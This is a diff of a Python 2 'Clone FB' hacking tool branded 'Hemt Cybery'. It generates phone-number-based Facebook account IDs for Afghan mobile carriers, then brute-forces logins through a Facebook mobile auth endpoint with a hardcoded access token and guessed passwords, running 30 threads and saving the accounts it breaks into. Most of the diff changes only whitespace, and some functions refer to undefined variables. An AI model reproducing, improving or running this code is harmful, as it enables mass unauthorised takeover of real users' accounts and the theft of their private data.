@@ -6,19 +6,21 @@ os.system('rm -rf .txt')
 for n in range(20000):
     nmbr = random.randint(1111111, 9999999)
     sys.stdout = open('.txt', 'a')
- 
+    print nmbr
+    sys.stdout.flush()
+
 try:
     import requests
 except ImportError:
     os.system('pip2 install mechanize')
- 
+
 try:
     import mechanize
 except ImportError:
     os.system('pip2 install request')
     time.sleep(1)
     os.system('Then type: python2 Clone-fb.py')
- 
+
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
@@ -30,38 +32,38 @@ br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 br.addheaders = [('user-agent', 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/233.0.0.16.158;FBPN/com.facebook.orca;FBLC/en_US;FBBV/172917909;FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/5.1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]')]
- 
+
 def keluar():
     os.sys.exit()
- 
- 
+
+
 def acak(b):
     w = 'ahtdzjc'
     d = ''
     for i in x:
         d += '!' + w[random.randint(0, len(w) - 1)] + i
- 
+
     return cetak(d)
- 
- 
+
+
 def cetak(b):
     w = 'ahtdzjc'
     for i in w:
         j = w.index(i)
         x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))
- 
+
     x += '\x1b[0m'
     x = x.replace('!0', '\x1b[0m')
     sys.stdout.write(x + '\n')
- 
- 
+
+
 def jalan(z):
     for e in z + '\n':
         sys.stdout.write(e)
         sys.stdout.flush()
         time.sleep(0.1)
- 
- 
+
+
 def tik():
     titik = [
      '.   ', '..  ', '... ']
@@ -69,8 +71,8 @@ def tik():
         print '\r\x1b[1;93mHemt.Cybery\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92\xe2\x96\x92..99% \x1b[1;93m' + o,
         sys.stdout.flush()
         time.sleep(1)
- 
- 
+
+
 back = 0
 oks = []
 id = []
@@ -82,7 +84,7 @@ os.system('toilet -f future  Hemt Cybery')
 print '\x1b[1;96m A\xea\x9c\xb0\xc9\xa2\xca\x9c\xe1\xb4\x80\xc9\xb4\xc9\xaas\xe1\xb4\x9b\xe1\xb4\x80\xc9\xb4 F\xe1\xb4\x80\xe1\xb4\x84\xe1\xb4\x87\xca\x99\xe1\xb4\x8f\xe1\xb4\x8f\xe1\xb4\x8b A\xe1\xb4\x84\xe1\xb4\x84\xe1\xb4\x8f\xe1\xb4\x9c\xc9\xb4\xe1\xb4\x9b C\xca\x9f\xe1\xb4\x8f\xc9\xb4\xe1\xb4\x87\xca\x80'
 print 44 * '\x1b[1;91m\xe2\x94\x80'
 time.sleep(0.09)
-print '\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  Hemt Cybery'
+print '\x1b[1;92m Author  \x1b[1;96m    : \x1b[1;93m  Raziqullah Saadat'
 print '\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  https://github.com/HemtKhan'
 print '\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  https://t.me/HemtHack'
 time.sleep(0.05)
@@ -100,7 +102,7 @@ while loop == 'true':
     else:
         print '\x1b[1;91m\xe2\x98\xa0\xef\xb8\x8fWRONG'
         os.system('xdg-open https://t.me/hemt_hack')
- 
+
 loop = 'true'
 while loop == 'true':
     passcode = raw_input('                   \x1b[1;93mINPUT PASSWORD \x1b[1;96m: ')
@@ -111,12 +113,12 @@ while loop == 'true':
     else:
         print '\x1b[1;91m\xe2\x98\xa0\xef\xb8\x8fWRONG'
         os.system('xdg-open https://t.me/hemt_afghan')
- 
+
 def lisensi():
     os.system('clear')
     login()
- 
- 
+
+
 def login():
     os.system('clear')
     os.system('toilet CLONE AFG FB ACCOUNT -f future --filter metal')
@@ -144,8 +146,8 @@ def login():
     time.sleep(0.05)
     print '\x1b[1;91m[\x1b[1;93m00\x1b[1;91m]\x1b[1;92m Exit'
     login_pilih()
- 
- 
+
+
 def login_pilih():
     peak = raw_input('\n\x1b[1;96mSelect an Option\x1b[1;97m : ')
     if peak == '':
@@ -167,14 +169,14 @@ def login_pilih():
         Find()
     elif peak == '00':
         Exit()
- 
- 
+
+
 def More():
     os.system('clear')
     os.system('xdg-open https://github.com/HemtKhan')
     os.system('login')
- 
- 
+
+
 def Find():
     os.system('clear')
     os.system('toilet -f future Find Me --filter border')
@@ -183,12 +185,12 @@ def Find():
     jalan('\x1b[1;96m Telegram\x1b[1;96m   :\x1b[1;96m   https://t.me/HemtHack')
     os.system('xdg-open https://t.me/HemtHack')
     os.system('login')
- 
- 
+
+
 def Exit():
     os.system('login')
- 
- 
+
+
 def Zeek():
     os.system('clear')
     os.system('toilet AFG  CRAK --filter gay -f standard')
@@ -226,8 +228,8 @@ def Zeek():
     print '\x1b[1;91m[\x1b[1;93m00\x1b[1;91m]\x1b[1;92m Exit'
     time.sleep(0.05)
     action()
- 
- 
+
+
 def action():
     global cpb
     global oks
@@ -244,12 +246,12 @@ def action():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
- 
+
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             blackmafiax()
- 
+
     elif peak == '2':
         os.system('clear')
         os.system('figlet -f small Afghan Wireless Mirror |lolcat')
@@ -259,12 +261,12 @@ def action():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
- 
+
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             blackmafiax()
- 
+
     elif peak == '3':
         os.system('clear')
         os.system('figlet -f small Roshan |lolcat')
@@ -274,12 +276,12 @@ def action():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
- 
+
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             blackmafiax()
- 
+
     elif peak == '4':
         os.system('clear')
         os.system('figlet -f small Roshan Mirror |lolcat')
@@ -289,12 +291,12 @@ def action():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
- 
+
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             blackmafiax()
- 
+
     elif peak == '5':
         os.system('clear')
         os.system('figlet -f small Etisalat |lolcat')
@@ -304,12 +306,12 @@ def action():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
- 
+
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             blackmafiax()
- 
+
     elif peak == '6':
         os.system('clear')
         os.system('figlet -f small Etisalat Mirror |lolcat')
@@ -319,12 +321,12 @@ def action():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
- 
+
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             blackmafiax()
- 
+
     elif peak == '7':
         os.system('clear')
         os.system('figlet -f small Salaam |lolcat')
@@ -334,12 +336,12 @@ def action():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
- 
+
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             blackmafiax()
- 
+
     elif peak == '8':
         os.system('clear')
         os.system('figlet -f small Afghan Telecom |lolcat')
@@ -349,12 +351,12 @@ def action():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
- 
+
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             blackmafiax()
- 
+
     elif peak == '9':
         os.system('clear')
         os.system('figlet -f small MTN Telecom |lolcat')
@@ -364,12 +366,12 @@ def action():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
- 
+
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
             blackmafiax()
- 
+
     elif peak == '10':
         os.system('clear')
         os.system('figlet -f small MTN  Mirror |lolcat')
@@ -379,7 +381,7 @@ def action():
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
                 id.append(line.strip())
- 
+
         except IOError:
             print '[!] File Not Found'
             raw_input('\n[ Back ]')
@@ -401,14 +403,14 @@ def action():
     jalan('\x1b[1;91m[\x1b[1;93m\xe2\x9c\x93\x1b[1;91m]\x1b[1;92m Process is Starting...')
     jalan('\x1b[1;91m[\x1b[1;93m\xe2\x9c\x93\x1b[1;91m]\x1b[1;92m To Stop Process Press Ctrl+z')
     print 50 * '\x1b[1;91m-'
- 
+
     def main(arg):
         user = arg
         try:
             os.mkdir('save')
         except OSError:
             pass
- 
+
         try:
             pass1 = user
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
@@ -459,7 +461,7 @@ def action():
                         cpb.append(c + user + pass3)
         except:
             pass
- 
+
     p = ThreadPool(30)
     p.map(main, id)
     print 50 * '\x1b[1;91m-'
@@ -470,7 +472,7 @@ def action():
     print '\n    \n    \n    \n    \n\n\x1b[1;91mThanks \x1b[1;97mUseing My CLONE FB Tool\n\x1b[1;92m My Telegram\x1b[1;97m@t.me/hemt_hack\n\x1b[1;93mGitHub\x1b[1;97mHemtKhan\n\x1b[1;94mInstagram\x1b[1;97m\xe2\x88\x86@\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97\xc3\x97'
     raw_input('\n\x1b[1;92m[\x1b[1;92mBack\x1b[1;95m]')
     login()
- 
- 
+
+
 if __name__ == '__main__':
     login()
